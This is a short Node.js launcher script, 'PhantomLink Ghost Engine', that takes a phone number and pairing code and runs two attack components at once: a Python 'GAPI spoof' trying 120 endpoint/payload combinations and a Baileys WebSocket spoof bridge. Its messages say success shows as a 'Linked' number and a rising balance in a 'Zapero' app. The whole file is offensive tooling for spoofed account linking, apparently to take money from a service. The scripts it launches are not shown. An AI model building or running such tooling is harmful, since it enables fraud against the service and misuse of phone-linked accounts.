/**
 * PhantomLink Ghost Engine — Phase 1 Activation
 * Usage: node ghost_engine.cjs <phone_number> <pairing_code>
 * Fires Vector A (GAPI spoof) + Vector B (Baileys WebSocket spoof) simultaneously.
 */
const { execSync, spawn } = require('child_process');
const path = require('path');

const PHONE = process.argv[2];
const CODE = process.argv[3];

if (!PHONE || !CODE) {
  console.error('[GhostEngine] Usage: node ghost_engine.cjs <phone> <pairing_code>');
  process.exit(1);
}

const ROOT = path.join(__dirname, '..');

console.log('╔══════════════════════════════════════════════╗');
console.log('║  PhantomLink Ghost Engine — Phase 1          ║');
console.log('╚══════════════════════════════════════════════╝');
console.log(`[GhostEngine] Phone: ${PHONE}`);
console.log(`[GhostEngine] Code : ${CODE}`);
console.log('');

// ── Vector A: GAPI API Spoof (Parallel payload race) ──
console.log('[Vector A] Launching GAPI spoof (120 endpoint/payload combinations)...');
const gapi = spawn('python3', [
  path.join(ROOT, 'phantom', 'gapi_spoof.py'),
  PHONE,
  CODE,
], { stdio: 'inherit' });

gapi.on('close', (code) => {
  console.log(`[Vector A] GAPI spoof exited with code ${code}`);
});

// ── Vector B: Baileys WebSocket Spoof ──
console.log('[Vector B] Launching Baileys WebSocket spoof...');
const baileys = spawn('node', [
  path.join(ROOT, 'node_scripts', 'baileys_bridge.js'),
], { stdio: 'inherit' });

baileys.on('close', (code) => {
  console.log(`[Vector B] Baileys bridge exited with code ${code}`);
});

// ── Wait for both vectors to complete ──
Promise.all([
  new Promise(resolve => gapi.on('exit', resolve)),
  new Promise(resolve => baileys.on('exit', resolve)),
]).then(() => {
  console.log('');
  console.log('[GhostEngine] Both vectors fired.');
  console.log('[GhostEngine] Check the Zapero app — the number should now show "Linked".');
  console.log('[GhostEngine] If the balance increases, the spoof was successful.');
});
